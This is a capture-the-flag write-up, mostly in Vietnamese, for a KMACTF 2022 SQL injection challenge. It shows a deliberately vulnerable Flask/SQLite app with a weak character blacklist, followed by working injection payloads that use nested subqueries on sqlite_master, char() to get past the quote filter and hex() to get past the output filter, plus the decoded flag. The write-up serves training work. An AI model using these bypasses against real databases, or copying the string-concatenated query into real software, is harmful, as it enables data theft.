# KMACTF 2022 dot 2

## Inject me

**Source**:
```python
from flask import Flask, render_template, render_template_string, request
import sqlite3
import re

# ............

def waf(str):
    if (len(str)) > 85 or "union" in str.lower():
        return False

    black_list = ["'", '"', '*', '\\', '/', '#', ';', '-']
    for c in black_list:
        if c in str:
            str = str.replace(c, "")

# ......

@app.route('/query',methods = ['GET'])
def addrec():
    if request.args.get("query") != "":
        query = request.args.get("query")
    
    query = waf(query)
    
    if query == False:
        return render_template_string("Dont cheat my fen =))")
    else:
        try:
            cur = get_db().execute('SELECT msg FROM ' + query + ' where msg like "%" and msg not like "%KMACTF{%" limit 1')
            result = cur.fetchall()

            if len(result) == 0:
                return render_template_string("No result")

            cur.close()
            return render_template("index.html", result = result)
        except:
            return render_template_string("Something went wrong")

# ............
```

```sql
SELECT msg FROM ' + query + ' where msg like "MSG-%" and msg not like "%KMACTF{%" limit 1
```
SQLi sau FROM statement.

![Screenshot (919)](https://user-images.githubusercontent.com/71699412/174470125-c56d26f1-adbd-4513-b025-dc0d7012adf1.png)

Ở đây ta chưa biết table name lẫn column name. Ta có thể dùng kĩ thuật `nested query` để lấy `sql` từ `sqlite_master`. Tuy nhiên, column trả về ở đây buộc phải là `msg` do đó ta alias `sql` thành `msg`.

```
(select sql as msg from sqlite_master)
```

![Screenshot (923)](https://user-images.githubusercontent.com/71699412/174470195-49853851-f522-496c-9671-33dae1752c55.png)

Tuy nhiên trả về `No result` là bởi sau `where`, `msg` phải bắt đầu với `MSG-` do đó ta cần thêm prefix là `MSG-`. Ngoài ra, các kí tự như `'` hay `"` bị block nên ta dùng function `char()` để bypass.
```
(select (char(77, 83, 71, 45) || sql) as msg from sqlite_master)
```

![Screenshot (921)](https://user-images.githubusercontent.com/71699412/174470203-6564543d-66c2-41b1-8fdb-4bb290500fc5.png)

Có column và table ta lấy flag thôi, chú ý tiếp điều kiện `not like "%KMACTF{%"` hay trong result trả về không thể chứa cụm trên, để bypass ta encode result thành hex.

```sql
(select (char(77, 83, 71, 45) || hex(flag)) as msg from flag)
```

![Screenshot (922)](https://user-images.githubusercontent.com/71699412/174470225-b3caf1d9-cc85-48d8-94b4-dae3753db1b5.png)

**Convert**:
```bash
echo 4B4D414354467B4A7573742073696D706C652073716C20696E6A656374696F6E207769746820736F6D6520747269636B737D | xxd -r -p
```

**flag**: `KMACTF{Just simple sql injection with some tricks}`

## pass
